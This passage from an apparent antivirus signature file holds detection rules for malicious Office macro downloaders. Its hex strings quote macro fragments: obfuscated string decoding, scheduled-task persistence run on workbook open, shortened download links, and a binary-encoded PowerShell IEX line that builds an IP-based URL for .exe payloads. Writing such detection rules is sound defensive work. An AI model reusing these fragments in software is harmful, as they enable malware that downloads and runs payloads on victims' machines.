		$a_01_0 = {57 73 68 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //01 00  WshShell = CreateObject("WScript.Shell")
		$a_01_1 = {55 73 65 72 50 72 6f 66 69 6c 65 20 3d 20 55 73 65 72 50 72 6f 66 69 6c 65 20 26 20 43 68 72 28 41 73 63 28 78 29 20 2d 20 31 29 } //01 00  UserProfile = UserProfile & Chr(Asc(x) - 1)
		$a_01_2 = {57 73 68 53 68 65 6c 6c 2e 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 73 28 22 54 65 6d 70 6c 61 74 65 73 22 29 } //01 00  WshShell.SpecialFolders("Templates")
		$a_01_3 = {6d 39 37 34 65 33 65 33 33 34 62 36 34 61 63 31 33 62 36 64 65 63 39 39 37 66 62 61 62 66 32 31 66 20 3d 20 22 6e 61 69 76 65 72 65 6d 6f 76 65 22 } //01 00  m974e3e334b64ac13b6dec997fbabf21f = "naiveremove"
		$a_03_4 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 44 65 63 72 79 70 74 28 22 71 7e 7e 7a 47 3c 3c 78 73 76 6e 77 73 90 02 02 73 7e 90 00 } //01 00 
		$a_03_5 = {3d 20 53 70 65 63 69 61 6c 50 61 74 68 20 2b 20 44 65 63 72 79 70 74 28 22 69 90 02 0f 3b 6e 90 02 02 6e 22 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_24{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 2f 25 39 31 31 25 39 31 31 25 39 31 31 25 39 31 31 25 39 31 31 40 6a 2e 6d 70 5c 6b 61 73 64 61 73 6a 61 73 6a 64 6f 61 73 64 61 73 61 73 64 6b 6f 64 73 64 73 6b 64 64 } //01 00  = "/%911%911%911%911%911@j.mp\kasdasjasjdoasdasasdkodsdskdd
		$a_01_1 = {3d 20 22 2f 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 40 6a 2e 6d 70 5c 64 73 61 6a 6f 73 64 36 37 38 39 68 6a 6b 61 78 62 6e 6d 7a 63 78 } //01 00  = "/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\dsajosd6789hjkaxbnmzcx
		$a_01_2 = {3d 20 22 2f 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 25 39 30 39 31 32 33 69 64 40 6a 2e 6d 70 5c 78 63 76 7a 68 62 63 66 74 72 64 73 61 68 6a 61 6b 73 64 75 68 6a 61 73 78 64 68 6b 7a 63 } //00 00  = "/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\xcvzhbcftrdsahjaksduhjasxdhkzc
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_25{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 08 00 00 01 00 "
		
	strings :
		$a_03_0 = {3d 20 43 68 72 57 28 43 4c 6e 67 28 28 90 02 0f 20 26 20 43 68 72 57 28 43 4c 6e 67 28 28 90 00 } //01 00 
		$a_03_1 = {26 20 43 68 72 28 43 4c 6e 67 28 28 90 02 03 20 58 6f 72 20 90 02 03 29 29 29 20 26 20 43 68 72 57 28 43 4c 6e 67 28 28 90 00 } //01 00 
		$a_03_2 = {53 65 74 20 73 65 72 76 69 63 65 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 68 65 64 75 6c 65 2e 53 65 72 76 69 63 65 22 29 90 02 03 43 61 6c 6c 20 73 65 72 76 69 63 65 2e 43 6f 6e 6e 65 63 74 90 02 03 44 69 6d 20 72 6f 6f 74 46 6f 6c 64 65 72 90 02 03 53 65 74 20 72 6f 6f 74 46 6f 6c 64 65 72 20 3d 20 73 65 72 76 69 63 65 2e 47 65 74 46 6f 6c 64 65 72 28 43 68 72 28 39 32 29 29 90 00 } //01 00 
		$a_01_3 = {43 61 6c 6c 20 72 6f 6f 74 46 6f 6c 64 65 72 2e } //01 00  Call rootFolder.
		$a_03_4 = {53 65 74 20 41 63 74 69 6f 6e 20 3d 20 74 61 73 6b 44 65 66 69 6e 69 74 69 6f 6e 2e 41 63 74 69 6f 6e 73 2e 43 72 65 61 74 65 28 41 63 74 69 6f 6e 54 79 70 65 45 78 65 63 29 90 02 03 41 63 74 69 6f 6e 2e 50 61 74 68 20 3d 20 90 00 } //01 00 
		$a_03_5 = {53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 90 02 15 20 3d 20 28 4d 6f 64 75 6c 65 31 2e 90 02 15 28 29 29 90 02 03 45 6e 64 20 53 75 62 90 00 } //01 00 
		$a_03_6 = {41 63 74 69 6f 6e 2e 41 72 67 75 6d 65 6e 74 73 20 3d 20 4d 6f 64 75 6c 65 32 2e 90 02 30 28 90 02 0a 5f 90 02 0a 29 20 26 20 4d 6f 64 75 6c 65 90 01 01 2e 90 02 0f 5f 90 00 } //01 00 
		$a_01_7 = {29 29 29 20 26 20 43 68 72 28 43 4c 6e 67 28 28 35 37 20 41 6e 64 20 35 31 29 29 29 20 26 20 43 68 72 28 43 4c 6e 67 28 28 } //00 00  ))) & Chr(CLng((57 And 51))) & Chr(CLng((
		$a_00_8 = {8f 22 02 00 04 } //00 04 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SS_MTB_26{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 02 00 "
		
	strings :
		$a_01_0 = {30 31 31 30 31 30 30 30 2c 30 31 31 31 30 31 30 30 2c 30 31 31 31 30 31 30 30 2c 30 31 31 31 30 30 30 30 2c 30 30 31 31 31 30 31 30 2c 30 30 31 30 31 31 31 31 2c 30 30 31 30 31 31 31 31 2c 30 30 31 31 30 30 30 31 2c 30 30 31 31 31 30 30 31 2c 30 30 31 31 30 30 31 30 2c 30 30 31 30 31 31 31 30 2c 30 30 31 31 30 30 31 30 2c 30 30 31 31 30 30 30 31 2c 30 30 31 31 30 30 30 30 2c 30 30 31 30 31 31 31 30 2c 30 30 31 31 30 30 31 30 2c 30 30 31 31 30 30 30 31 2c 30 30 31 31 30 31 30 30 2c 30 30 31 30 31 31 31 30 2c 30 30 31 31 30 30 31 30 2c 30 30 31 31 30 30 31 30 2c 30 30 31 31 30 30 30 31 } //01 00  01101000,01110100,01110100,01110000,00111010,00101111,00101111,00110001,00111001,00110010,00101110,00110010,00110001,00110000,00101110,00110010,00110001,00110100,00101110,00110010,00110010,00110001
		$a_01_1 = {30 30 31 30 31 31 31 31 2c 30 31 31 30 30 31 31 30 2c 30 31 31 30 31 31 31 31 2c 30 31 31 30 31 31 31 30 2c 30 31 31 31 30 31 30 30 2c 30 30 31 30 31 31 31 30 2c 30 31 31 30 30 31 30 31 2c 30 31 31 31 31 30 30 30 2c 30 31 31 30 30 31 30 31 } //01 00  00101111,01100110,01101111,01101110,01110100,00101110,01100101,01111000,01100101
		$a_01_2 = {30 30 31 30 31 31 31 31 2c 30 31 31 31 30 30 31 30 2c 30 31 31 30 30 31 30 31 2c 30 31 31 30 31 31 30 31 2c 30 31 31 30 31 30 30 31 2c 30 31 31 31 30 31 30 30 2c 30 30 31 30 31 31 31 30 2c 30 31 31 30 30 31 30 31 2c 30 31 31 31 31 30 30 30 2c 30 31 31 30 30 31 30 31 } //01 00  00101111,01110010,01100101,01101101,01101001,01110100,00101110,01100101,01111000,01100101
		$a_01_3 = {5b 53 79 73 74 65 6d 2e 54 65 78 74 2e 45 6e 63 6f 64 69 6e 67 5d 3a 3a 55 54 46 38 2e 47 65 74 53 74 72 69 6e 67 28 5b 53 79 73 74 65 6d 2e 43 6f 6e 76 65 72 74 5d 3a 3a 54 6f 49 6e 74 33 32 28 24 5f 2c 32 29 29 20 7d 3b 5b 73 79 73 74 65 6d 2e 53 74 72 69 6e 67 5d 3a 3a 4a 6f 69 6e 28 27 27 2c 20 24 76 37 38 64 66 30 29 7c 49 45 58 2a 2a 2a 6e 65 77 3a 31 33 37 30 39 36 32 30 2d 43 32 37 39 2d 31 31 43 45 2d 41 34 39 45 2d 34 34 34 35 35 33 35 34 30 30 30 30 } //00 00  [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2)) };[system.String]::Join('', $v78df0)|IEX***new:13709620-C279-11CE-A49E-444553540000
	condition:
		any of ($a_*)
 
}